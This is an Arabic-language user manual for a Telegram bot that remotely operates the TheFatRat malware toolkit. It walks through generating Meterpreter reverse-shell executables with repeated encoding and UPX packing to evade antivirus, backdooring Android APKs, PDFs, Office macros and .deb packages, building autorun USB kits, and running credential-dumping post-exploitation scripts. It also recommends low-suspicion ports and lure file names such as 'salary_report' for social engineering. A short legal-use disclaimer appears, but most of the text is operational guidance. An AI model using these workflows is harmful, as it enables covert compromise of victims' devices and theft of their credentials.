# 🤖 دليل بوت Telegram لـ TheFatRat

## نظرة عامة

يوفر TheFatRat بوت Telegram متطور يمكنه إدارة جميع وظائف النظام الأساسية عن بُعد. هذا الدليل يشرح كيفية استخدام البوت بشكل كامل.

---

## 🔐 متطلبات الإعداد

### متغيرات البيئة المطلوبة:
```bash
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_OWNER_ID=your_telegram_user_id
ORCH_URL=http://127.0.0.1:8000
```

### التحقق من التشغيل:
```bash
# في مجلد المشروع
cd /workspace/bot
python3 bot.py
```

---

## 📋 الأوامر المباشرة (Direct Commands)

### 1. أوامر النظام الأساسية

#### `/start`
- **الوصف**: بدء البوت وفتح القائمة الرئيسية
- **الاستخدام**: اكتب `/start` في أي وقت
- **النتيجة**: عرض القائمة الرئيسية مع جميع الخيارات المتاحة

#### `/menu`
- **الوصف**: نفس وظيفة `/start` - عرض القائمة الرئيسية
- **الاستخدام**: اكتب `/menu` للعودة للقائمة في أي وقت

#### `/ping`
- **الوصف**: اختبار حالة البوت والاتصال
- **الاستخدام**: اكتب `/ping`
- **النتيجة**: رد "pong ✅" يؤكد أن البوت يعمل

#### `/cancel <task_id>`
- **الوصف**: إلغاء مهمة قيد التنفيذ
- **الاستخدام**: `/cancel task_id_here`
- **مثال**: `/cancel abc123-def456`

---

## 🎛️ الأزرار التفاعلية والخيارات

عند كتابة `/start` ستظهر القائمة التالية مع الأزرار التفاعلية:

### القائمة الرئيسية

| الزر | الوظيفة | النوع |
|------|---------|-------|
| **بايلود ويندوز** | إنشاء ملف EXE بسيط لـ Windows | Payload |
| **EXE متقدم (Windows)** | إنشاء EXE بخيارات متقدمة | Advanced Payload |
| **مستمع (Listener)** | تشغيل مستمع Metasploit | Network |
| **Android APK** | حقن حمولة في تطبيق Android | Mobile |
| **PDF مضمَّن** | دمج payload في ملف PDF | Document |
| **مستند Office** | إنشاء مستند Office خبيث | Document |
| **حزمة .deb** | تلغيم حزمة Linux | Package |
| **حزمة Autorun** | ملفات التشغيل التلقائي | USB/CD |
| **ما بعد الاستغلال** | تنفيذ scripts ما بعد الاختراق | Post-Exploitation |

---

## 🔧 شرح مفصل لكل خيار

### 1. 🔹 بايلود ويندوز (Windows Payload)

**الغرض**: إنشاء ملف `.exe` بسيط يحتوي على Meterpreter للاتصال العكسي

**صيغة الإدخال**:
```
LHOST LPORT OUTPUT_NAME
```

**مثال**:
```
192.168.1.100 4444 my_payload
```

**شرح المعاملات**:
- `LHOST`: عنوان IP الخاص بالمهاجم (جهازك)
- `LPORT`: المنفذ للاستماع (مثل 4444, 5555, 8080)
- `OUTPUT_NAME`: اسم الملف الناتج (بدون امتداد)

**النتيجة**: ملف `my_payload.exe` جاهز للتحميل والإرسال

**الاستخدام**: مناسب للاختبارات البسيطة والتعلم

---

### 2. 🔹 EXE متقدم (Advanced Windows EXE)

**الغرض**: إنشاء EXE بخيارات تشفير وإخفاء متقدمة لتجاوز Antivirus

**صيغة الإدخال**:
```
LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX
```

**مثال**:
```
127.0.0.1 4444 advanced_payload x86 x86/shikata_ga_nai:5 true
```

**شرح المعاملات المتقدمة**:

#### معمارية النظام (ARCH):
- `x86`: للأنظمة 32-bit
- `x64`: للأنظمة 64-bit

#### المشفرات (ENCODERS):
- `x86/shikata_ga_nai:5` - تشفير 5 مرات (الأقوى)
- `x86/countdown:3` - تشفير 3 مرات
- `x86/fnstenv_mov:2` - تشفير 2 مرة
- يمكن دمج عدة مشفرات: `x86/shikata_ga_nai:5,x86/countdown:3`

#### ضغط UPX:
- `true`: تفعيل ضغط الملف (حجم أصغر، صعوبة تحليل)
- `false`: عدم الضغط (حجم أكبر، سرعة تنفيذ)

**النتيجة**: ملف EXE محمي ومشفر قادر على تجاوز معظم برامج الحماية

---

### 3. 🔹 مستمع (Listener)

**الغرض**: تشغيل مستمع Metasploit لاستقبال الاتصالات من الأهداف المخترقة

**صيغة الإدخال**:
```
LHOST LPORT
```

**أمثلة الاستخدام**:
```
0.0.0.0 4444        # الاستماع على جميع واجهات الشبكة
192.168.1.100 5555  # الاستماع على IP محدد فقط
10.0.0.5 8080       # استخدام منفذ ويب
```

**عناوين IP الشائعة**:
- `0.0.0.0`: الاستماع على جميع الواجهات
- `192.168.1.x`: الشبكة المحلية
- `10.0.0.x`: شبكات المؤسسات
- `127.0.0.1`: الاختبار المحلي فقط

**المنافذ المفضلة**:
- `4444, 5555`: منافذ Metasploit التقليدية
- `80, 443, 8080, 8443`: منافذ الويب (أقل اشتباهاً)
- `53, 22`: منافذ خدمات النظام

**النتيجة**: ملف `handler.rc` جاهز لتشغيل المستمع في Metasploit

---

### 4. 🔹 Android APK

عند اختيار Android APK، ستحصل على خيارين:

#### أ) الإدخال البسيط:
**صيغة الإدخال**:
```
LHOST LPORT
```

**مثال**:
```
10.0.2.2 4444
```

**ملاحظة**: `10.0.2.2` هو IP الافتراضي للـ Android Emulator

#### ب) الخيارات المتقدمة:
**صيغة الإدخال**:
```
MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]
```

**مثال بدون توقيع**:
```
backdoor_apk keep 10.0.2.2 4444 myapp
```

**مثال مع التوقيع الرقمي**:
```
backdoor_apk keep 10.0.2.2 4444 myapp /path/keystore.jks:myalias:storepass:keypass
```

**شرح المعاملات المتقدمة**:

#### وضع التشغيل (MODE):
- `backdoor_apk`: حقن payload في APK موجود
- `standalone`: إنشاء APK جديد كامل

#### استراتيجية الصلاحيات (PERM):
- `keep`: الاحتفاظ بصلاحيات APK الأصلي
- `merge`: دمج صلاحيات الـ payload مع الأصلي

#### معلومات التوقيع (اختيارية):
- `KEYSTORE`: مسار ملف keystore
- `ALIAS`: اسم المفتاح
- `STOREPASS`: كلمة مرور المخزن
- `KEYPASS`: كلمة مرور المفتاح

**النتيجة**: ملف APK موقع وجاهز للتثبيت

---

### 5. 🔹 PDF مضمَّن (Embedded PDF)

**الغرض**: دمج payload في ملف PDF لاستغلال ثغرات قارئ PDF

**صيغة الإدخال**:
```
LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]
```

**مثال**:
```
127.0.0.1 4444 report /workspace/PE/original.pdf
```

**شرح المعاملات**:
- `BASE_PDF_PATH`: مسار ملف PDF أصلي (اختياري)
- إذا لم يُحدد، سيتم استخدام ملف افتراضي

**النتيجة**: ملف PDF يبدو عادياً لكنه ينفذ payload عند الفتح

---

### 6. 🔹 مستند Office

**الغرض**: إنشاء مستند Office يحتوي على ماكرو خبيث

**صيغة الإدخال**:
```
TARGET LHOST LPORT OUTPUT_NAME
```

**مثال**:
```
ms_word_windows 127.0.0.1 4444 invoice
```

**الأهداف المدعومة (TARGET)**:
- `ms_word_windows`: Microsoft Word على Windows
- `ms_word_mac`: Microsoft Word على macOS
- `openoffice_windows`: OpenOffice على Windows  
- `openoffice_linux`: OpenOffice على Linux

**أمثلة أسماء ملفات جذابة**:
- `invoice` - فاتورة
- `contract` - عقد
- `report` - تقرير
- `cv` - سيرة ذاتية

**النتيجة**: مستند Office يحتوي على ماكرو ضار

---

### 7. 🔹 حزمة .deb

**الغرض**: تلغيم حزمة تثبيت Linux (.deb)

**صيغة الإدخال**:
```
DEB_PATH LHOST LPORT OUTPUT_NAME
```

**مثال**:
```
/path/app.deb 127.0.0.1 4444 mydeb
```

**متطلبات**:
- ملف .deb أصلي موجود
- صلاحيات كتابة في المجلد

**النتيجة**: حزمة .deb ملغومة تبدو شرعية

---

### 8. 🔹 حزمة Autorun

**الغرض**: إنشاء ملفات التشغيل التلقائي للـ USB/CD

**صيغة الإدخال**:
```
[EXE_PATH] [EXE_NAME]
```

**أمثلة**:
```
/path/payload.exe myapp.exe    # استخدام ملف محدد
                               # سطر فارغ للملف الافتراضي
```

**محتويات الحزمة**:
- `autorun.inf`: ملف التشغيل التلقائي
- الملف التنفيذي المحدد
- أيقونة مخصصة

**النتيجة**: مجلد جاهز للنسخ على USB أو حرق على CD

---

### 9. 🔹 ما بعد الاستغلال (Post-Exploitation)

**الغرض**: تنفيذ scripts متخصصة على الأهداف المخترقة

**صيغة الإدخال**:
```
SCRIPT_NAME [SESSION_ID]
```

**الـ Scripts المتاحة**:

#### `sysinfo.rc` - معلومات النظام:
```
sysinfo.rc        # على جميع الجلسات
sysinfo.rc 1      # على الجلسة رقم 1
```
- معلومات نظام التشغيل
- معلومات الشبكة
- المستخدمين المتصلين

#### `fast_migrate.rc` - الانتقال السريع:
```
fast_migrate.rc 2
```
- انتقال العملية لحماية الجلسة
- تجنب اكتشاف النشاط المشبوه

#### `cred_dump.rc` - استخراج كلمات المرور:
```
cred_dump.rc 1
```
- استخراج كلمات مرور Windows
- hash values للمستخدمين
- معلومات المصادقة المحفوظة

#### `gather.rc` - جمع معلومات شاملة:
```
gather.rc
```
- جمع ملفات مهمة
- معلومات البرامج المثبتة
- إعدادات الأمان

**النتيجة**: تقارير مفصلة وملفات مستخرجة

---

## 🔄 سير العمل النموذجي

### مثال كامل لإنشاء payload متقدم:

#### الخطوة 1: بدء البوت
```
/start
```

#### الخطوة 2: اختيار النوع
اضغط على **"EXE متقدم (Windows)"**

#### الخطوة 3: إدخال المعاملات
```
192.168.1.100 4444 stealth_payload x64 x86/shikata_ga_nai:5,x86/countdown:3 true
```

#### الخطوة 4: مراقبة التقدم
ستحصل على تحديثات:
- "تم إنشاء المهمة: task_abc123"
- "الحالة: جارِ التحضير"
- "الحالة: جارِ التنفيذ"
- "الحالة: تم بنجاح"

#### الخطوة 5: تلقي النتائج
- الملف النهائي يُرسل تلقائياً
- ملفات مساعدة إضافية (handler scripts, etc.)

---

## ⚡ نصائح الاستخدام المتقدم

### 🔸 إعدادات الشبكة المثلى:

#### للشبكة المحلية:
```bash
LHOST: 192.168.1.x     # عنوان جهازك في الشبكة المحلية
LPORT: 4444            # منفذ تقليدي
```

#### للاختبار عبر الإنترنت:
```bash
LHOST: your_public_ip  # عنوانك العام
LPORT: 443             # منفذ HTTPS (أقل اشتباهاً)
```

#### للـ Android Emulator:
```bash
LHOST: 10.0.2.2        # IP افتراضي للمحاكي
LPORT: 5555            # منفذ مناسب
```

### 🔸 اختيار المنافذ الذكي:

#### منافذ أقل اشتباهاً:
- `80, 443`: حركة الويب العادية
- `53`: DNS queries
- `22`: SSH connections
- `25`: SMTP email

#### منافذ عالية الأداء:
- `4444, 5555`: سريعة لكن مشبوهة
- `8080, 8443`: بديل للويب
- `9999`: عالي لكن واضح

### 🔸 تسمية الملفات الذكية:

#### أسماء غير مشبوهة:
```
update.exe
installer.exe
setup.exe
document.exe
```

#### أسماء جذابة للهندسة الاجتماعية:
```
urgent_document
salary_report
security_update
```

### 🔸 إدارة المهام المتقدمة:

#### عرض حالة المهام:
- المهمة ID تظهر فور الإنشاء
- حفظ الـ ID للمرجع المستقبلي

#### إلغاء المهام:
```bash
/cancel task_abc123
```

#### إعادة التشغيل:
```bash
/start                 # قائمة جديدة
/menu                  # نفس الأثر
```

---

## 🔒 الأمان والحماية

### 🛡️ ميزات الأمان المدمجة:

#### التحكم في الوصول:
- مقيد لمالك واحد فقط (`TELEGRAM_OWNER_ID`)
- رفض تلقائي للمستخدمين غير المخولين
- تسجيل جميع المحاولات

#### حماية البيانات:
- تشفير الاتصالات عبر Telegram API
- عدم تخزين معلومات حساسة
- حذف تلقائي للملفات المؤقتة

### ⚠️ تحذيرات الاستخدام:

#### الاستخدام القانوني فقط:
- اختبار الأنظمة المملوكة لك فقط
- بيئات الاختبار المعزولة
- التدريب والتعليم المرخص

#### احتياطات الأمان:
- استخدم VPN عند الضرورة
- تجنب الشبكات العامة
- احذف الملفات بعد الانتهاء

---

## 🔧 استكشاف الأخطاء وحلها

### مشاكل شائعة وحلولها:

#### "تم رفض الوصول":
```bash
# تحقق من TELEGRAM_OWNER_ID
echo $TELEGRAM_OWNER_ID

# احصل على user ID الصحيح من @userinfobot
```

#### "خطأ في الاتصال":
```bash
# تحقق من حالة الـ orchestrator
curl http://127.0.0.1:8000/health

# إعادة تشغيل الخدمة
cd /workspace/orchestrator
python3 app.py
```

#### "مهلة انتهت":
```bash
# للمهام الطويلة، انتظر أكثر
# أو تحقق من السجلات
tail -f /workspace/bot/bot.log
```

#### "ملف غير موجود":
```bash
# تحقق من المسارات
ls -la /workspace/APKS/
ls -la /workspace/PE/
```

---

## 📊 مراقبة الأداء

### مؤشرات الأداء:

#### أوقات التنفيذ المتوقعة:
- **Payload بسيط**: 10-30 ثانية
- **EXE متقدم**: 30-60 ثانية  
- **Android APK**: 60-120 ثانية
- **PDF/Office**: 20-45 ثانية

#### استهلاك الموارد:
- **CPU**: متوسط أثناء التشفير
- **Memory**: 100-500 MB حسب النوع
- **Disk**: 50-200 MB للملفات المؤقتة

### سجلات النظام:

#### سجل البوت:
```bash
tail -f /workspace/bot/bot.log
```

#### سجل المهام:
```bash
tail -f /workspace/logs/audit.jsonl
```

---

## 🚀 الخلاصة

بوت Telegram لـ TheFatRat يوفر:

✅ **تحكم كامل عن بُعد** في جميع وظائف النظام  
✅ **واجهة عربية** سهلة الاستخدام  
✅ **أمان متقدم** مع التحكم في الوصول  
✅ **إدارة ملفات تلقائية** مع التسليم المباشر  
✅ **مراقبة real-time** لحالة المهام  
✅ **دعم جميع أنواع** الـ payloads والاستغلال  

هذا النظام يجعل TheFatRat قابل للاستخدام من أي مكان في العالم عبر Telegram فقط!

---

## 📞 المساعدة والدعم

### للحصول على المساعدة:
1. اقرأ هذا الدليل كاملاً
2. تحقق من سجلات النظام
3. اختبر الأوامر البسيطة أولاً (`/ping`)
4. راجع ملفات الإعداد

### الإبلاغ عن المشاكل:
- وصف مفصل للمشكلة
- نسخ من رسائل الخطأ
- خطوات إعادة الإنتاج
- معلومات النظام

---

*تم إنشاء هذا الدليل تلقائياً بواسطة نظام التحليل المتقدم لـ TheFatRat*